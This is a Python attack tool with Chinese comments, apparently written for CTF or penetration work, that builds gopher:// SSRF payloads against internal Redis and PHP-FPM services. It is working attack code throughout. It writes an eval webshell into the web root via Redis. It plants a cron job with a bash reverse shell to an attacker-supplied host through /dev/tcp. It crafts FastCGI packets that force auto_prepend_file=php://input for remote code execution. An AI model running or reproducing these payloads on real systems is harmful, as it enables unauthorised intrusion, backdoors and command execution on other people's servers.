#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: SSRF gopher 构造器 —— 生成打内网 Redis(写 webshell/计划任务反弹)与
     FastCGI(9000 端口 RCE) 的 gopher:// payload, 含 URL 编码封装与二次编码选项
适用条件:
    - 有 SSRF 点且支持 gopher 协议（可用性取决于客户端构建与协议白名单，
      并无特定最低版本门槛；打不通时先手动验证目标侧 gopher 是否放行）
    - Redis: 未授权或已知密码; FastCGI: PHP-FPM 监听 9000 可达 + 知道网站绝对路径
用法:
    python web_ssrf_gopher.py redis --redis-mode webshell --ip 127.0.0.1 --port 6379 \
        --webroot /var/www/html
    python web_ssrf_gopher.py redis --redis-mode cron --ip 127.0.0.1 --lhost VPS_IP --lport 4444
    python web_ssrf_gopher.py fcgi --ip 127.0.0.1 --port 9000 --docroot /var/www/html \
        --script /index.php --cmd "system('cat /flag');"
    加 --double 对整体再 URL 编码一次(用于 SSRF 参数还会被解码一层时)
"""
import argparse
import urllib.parse

CRLF = "\r\n"


def redis_cmd(*args) -> str:
    """RESP 数组协议封装 redis 命令(比 inline 更稳)"""
    out = f"*{len(args)}{CRLF}"
    for a in args:
        a = str(a)
        out += f"${len(a)}{CRLF}{a}{CRLF}"
    return out


def build_redis_webshell(webroot: str, shell_name: str = "shell.php") -> str:
    """写 webshell: CONFIG SET dir/dbfilename -> SET 内容 -> SAVE 落盘"""
    shell = "<?php eval($_REQUEST[1]);?>"
    return (
        redis_cmd("CONFIG", "SET", "dir", webroot)
        + redis_cmd("CONFIG", "SET", "dbfilename", shell_name)
        + redis_cmd("SET", "x", shell)
        + redis_cmd("SAVE")
        + redis_cmd("QUIT")
    )


def build_redis_cron(lhost: str, lport: int) -> str:
    """写计划任务反弹 shell: 落到 /var/spool/cron/root(CentOS) 或 crontabs(Ubuntu 用 /var/spool/cron/crontabs/root)"""
    cron = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
    return (
        redis_cmd("CONFIG", "SET", "dir", "/var/spool/cron")
        + redis_cmd("CONFIG", "SET", "dbfilename", "root")
        + redis_cmd("SET", "x", cron)
        + redis_cmd("SAVE")
        + redis_cmd("QUIT")
    )


def fcgi_name_value(name: str, value: str) -> bytes:
    """FastCGI PARAMS 的 key-value 编码(长度 <128 单字节, 否则 4 字节)"""
    n, v = name.encode(), value.encode()
    head = b""
    head += bytes([len(n)]) if len(n) < 128 else (len(n) | 0x80000000).to_bytes(4, "big")
    head += bytes([len(v)]) if len(v) < 128 else (len(v) | 0x80000000).to_bytes(4, "big")
    return head + n + v


def fcgi_record(rtype: int, content: bytes, req_id: int = 1) -> bytes:
    """FastCGI 记录头: version/type/reqId/contentLen/padLen/reserved, 内容补齐 8 字节"""
    pad = (8 - len(content) % 8) % 8
    return (bytes([1, rtype]) + req_id.to_bytes(2, "big") +
            len(content).to_bytes(2, "big") + bytes([pad, 0]) + content + b"\x00" * pad)


def build_fcgi(docroot: str, script: str, php_code: str) -> bytes:
    """FastCGI RCE: auto_prepend_file=php://input + allow_url_include=On
    （php://input 属 URL include，受 allow_url_include 约束，默认 Off，
    缺这条在 PHP 5.2+ 默认配置下静默不执行）+ STDIN 里带 PHP 代码"""
    params = (
        fcgi_name_value("SCRIPT_FILENAME", docroot + script)
        + fcgi_name_value("DOCUMENT_ROOT", docroot)
        + fcgi_name_value("REQUEST_METHOD", "GET")
        + fcgi_name_value("SCRIPT_NAME", script)
        + fcgi_name_value("SERVER_SOFTWARE", "php/fcgiclient")
        + fcgi_name_value("PHP_VALUE", "allow_url_include = On")
        + fcgi_name_value("PHP_ADMIN_VALUE", "auto_prepend_file = php://input")
    )
    body = fcgi_record(1, (1).to_bytes(2, "big") + b"\x00" * 6)  # BEGIN_REQUEST: role=RESPONDER(2B)+flags(1B)+保留(5B)
    body += fcgi_record(4, params)                               # PARAMS
    body += fcgi_record(4, b"")                                  # PARAMS 空包收尾
    body += fcgi_record(5, php_code.encode())                    # STDIN: PHP 代码
    body += fcgi_record(5, b"")                                  # STDIN 收尾
    return body                                                  # 原始字节，由 wrap_gopher 统一按字节编码


def wrap_gopher(ip: str, port: int, raw, double: bool) -> str:
    """拼成 gopher:// 并做 URL 编码; double 用于 SSRF 层还会再解码一次的场景。
    raw 接受 str 或 bytes；bytes 直接编码（FastCGI 是二进制协议，
    若先 decode 成 str 再 quote 会被 UTF-8 重编码破坏 ≥0x80 的字节）。"""
    if isinstance(raw, str):
        raw = raw.encode("utf-8")
    encoded = urllib.parse.quote(raw, safe="")
    if double:
        encoded = urllib.parse.quote(encoded, safe="")
    return f"gopher://{ip}:{port}/_{encoded}"


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="SSRF gopher payload 构造器")
    ap.add_argument("mode", choices=["redis", "fcgi"])
    ap.add_argument("--ip", default="127.0.0.1", help="内网目标 IP")
    ap.add_argument("--port", type=int, default=6379, help="Redis 端口, fcgi 用 9000")
    ap.add_argument("--redis-mode", choices=["webshell", "cron"], default="webshell",
                    help="redis: 写 webshell 或计划任务反弹")
    ap.add_argument("--webroot", default="/var/www/html", help="webshell 落点目录")
    ap.add_argument("--shell-name", default="shell.php")
    ap.add_argument("--lhost", help="cron 反弹接 VPS IP")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--docroot", default="/var/www/html", help="fcgi: 网站绝对路径")
    ap.add_argument("--script", default="/index.php", help="fcgi: 已存在的 php 文件")
    ap.add_argument("--cmd", default="system('ls /');", help="fcgi: 要执行的 PHP 语句")
    ap.add_argument("--double", action="store_true", help="整体二次 URL 编码")
    args = ap.parse_args()

    if args.mode == "redis":
        if args.redis_mode == "webshell":
            raw = build_redis_webshell(args.webroot, args.shell_name)
        else:
            assert args.lhost, "--lhost 必填"
            raw = build_redis_cron(args.lhost, args.lport)
    else:
        raw = build_fcgi(args.docroot, args.script, "<?php " + args.cmd + " ?>")

    payload = wrap_gopher(args.ip, args.port, raw, args.double)
    print("[*] 原始 gopher URL:")
    print(payload)
    # 常见投递方式: 直接塞进 SSRF 参数; curl 场景先一次解码后可见明文 RESP/FastCGI 包
    # 打不通时: 1) 换 dict:// 逐步执行 CONFIG/SET/SAVE  2) 确认目标客户端协议白名单放行 gopher
